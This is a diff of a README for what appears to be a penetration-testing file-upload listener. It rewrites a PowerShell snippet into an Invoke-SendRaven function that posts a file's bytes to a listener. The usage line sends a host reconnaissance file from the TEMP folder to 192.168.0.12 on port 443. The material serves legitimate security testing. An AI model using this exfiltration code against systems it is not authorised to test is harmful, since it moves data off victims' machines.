@@ -72,32 +72,44 @@ Start the HTTP server on all on a specific interface (192.168.0.12), listening o
 Uploading files using PowerShell:
 
 ```powershell
-# Listener
-$Uri = "http://192.168.0.12:443/"
+function Invoke-SendRaven {
+    param (
+        [string]$Uri,
+        [string]$FilePath
+    )
 
-# Target File
-$File = Get-Item "C:\Path\To\File"
-$Content = [System.IO.File]::ReadAllBytes($File.FullName)
-$Boundary = [System.Guid]::NewGuid().ToString()
+    # Target File
+    $File = Get-Item $FilePath
+    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
+    $Boundary = [System.Guid]::NewGuid().ToString()
 
-# Request Headers
-$Headers = @{
-    "Content-Type" = "multipart/form-data; boundary=$Boundary"
+    # Request Headers
+    $Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $Headers.Add("Content-Type", "multipart/form-data; boundary=$Boundary")
+
+    # Create the request
+    $Request = [System.Net.WebRequest]::Create($Uri)
+    $Request.Method = "POST"
+    $Request.ContentType = "multipart/form-data; boundary=$Boundary"
+
+    # Request Body
+    $Stream = $Request.GetRequestStream()
+    $Encoding = [System.Text.Encoding]::ASCII
+
+    $Stream.Write($Encoding.GetBytes("--$Boundary`r`n"), 0, ("--$Boundary`r`n").Length)
+    $Stream.Write($Encoding.GetBytes("Content-Disposition: form-data; name=`"file`"; filename=`"$($File.Name)`"`r`n"), 0, ("Content-Disposition: form-data; name=`"file`"; filename=`"$($File.Name)`"`r`n").Length)
+    $Stream.Write($Encoding.GetBytes("Content-Type: application/octet-stream`r`n`r`n"), 0, ("Content-Type: application/octet-stream`r`n`r`n").Length)
+    $Stream.Write($Content, 0, $Content.Length)
+    $Stream.Write($Encoding.GetBytes("`r`n--$Boundary--`r`n"), 0, ("`r`n--$Boundary--`r`n").Length)
+    $Stream.Close()
+
+    # Upload File
+    $Response = $Request.GetResponse()
+    $Response.Close()
 }
 
-# Request Body
-$Body = @"
---$Boundary
-Content-Disposition: form-data; name="file"; filename="$($File.Name)"
-Content-Type: application/octet-stream
-
-$Content
-
---$Boundary--
-"@
-
-# Upload File
-Invoke-WebRequest -UseBasicParsing -Uri $Uri -Method "POST" -Headers $Headers -Body $Body
+# Usage
+Invoke-SendRaven -Uri http://192.168.0.12:443/ -FilePath $ENV:TEMP\HostRecon.txt
 ```
 
 Uploading files using Python3:
